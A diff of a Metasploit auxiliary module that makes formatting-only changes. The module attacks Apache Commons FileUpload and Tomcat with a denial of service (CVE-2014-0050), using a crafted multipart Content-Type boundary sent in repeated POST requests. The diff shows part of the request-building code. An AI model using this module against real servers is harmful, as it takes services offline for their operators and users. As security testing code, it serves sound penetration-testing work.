@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,46 +7,45 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Dos
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'            => 'Apache Commons FileUpload and Apache Tomcat DoS',
-      'Description'     => %q{
-        This module triggers an infinite loop in Apache Commons FileUpload 1.0
-        through 1.3 via a specially crafted Content-Type header.
-        Apache Tomcat 7 and Apache Tomcat 8 use a copy of FileUpload to handle
-        mime-multipart requests, therefore, Apache Tomcat 7.0.0 through 7.0.50
-        and 8.0.0-RC1 through 8.0.1 are affected by this issue. Tomcat 6 also
-        uses Commons FileUpload as part of the Manager application.
-       },
-       'Author'         =>
-         [
-           'Unknown', # This issue was reported to the Apache Software Foundation and accidentally made public.
-           'ribeirux' # metasploit module
-         ],
-       'License'        => MSF_LICENSE,
-       'References'     =>
-         [
-           ['CVE', '2014-0050'],
-           ['URL', 'http://tomcat.apache.org/security-8.html'],
-           ['URL', 'http://tomcat.apache.org/security-7.html']
-         ],
-        'DisclosureDate' => 'Feb 6 2014'
-      ))
+                      'Name'            => 'Apache Commons FileUpload and Apache Tomcat DoS',
+                      'Description'     => %q(
+                        This module triggers an infinite loop in Apache Commons FileUpload 1.0
+                        through 1.3 via a specially crafted Content-Type header.
+                        Apache Tomcat 7 and Apache Tomcat 8 use a copy of FileUpload to handle
+                        mime-multipart requests, therefore, Apache Tomcat 7.0.0 through 7.0.50
+                        and 8.0.0-RC1 through 8.0.1 are affected by this issue. Tomcat 6 also
+                        uses Commons FileUpload as part of the Manager application.
+                       ),
+                      'Author'         =>
+                         [
+                           'Unknown', # This issue was reported to the Apache Software Foundation and accidentally made public.
+                           'ribeirux' # metasploit module
+                         ],
+                      'License'        => MSF_LICENSE,
+                      'References'     =>
+                         [
+                           ['CVE', '2014-0050'],
+                           ['URL', 'http://tomcat.apache.org/security-8.html'],
+                           ['URL', 'http://tomcat.apache.org/security-7.html']
+                         ],
+                      'DisclosureDate' => 'Feb 6 2014'))
 
-      register_options(
-        [
-          Opt::RPORT(8080),
-          OptString.new('TARGETURI', [ true,  "The request URI", '/']),
-          OptInt.new('RLIMIT', [ true,  "Number of requests to send",50])
-        ], self.class)
+    register_options(
+      [
+        Opt::RPORT(8080),
+        OptString.new('TARGETURI', [ true, "The request URI", '/']),
+        OptInt.new('RLIMIT', [ true, "Number of requests to send", 50])
+      ], self.class
+    )
   end
 
   def run
-    boundary = "0"*4092
+    boundary = "0" * 4092
     opts = {
       'method'         => "POST",
       'uri'            => normalize_uri(target_uri.to_s),
@@ -75,4 +75,3 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 end
-
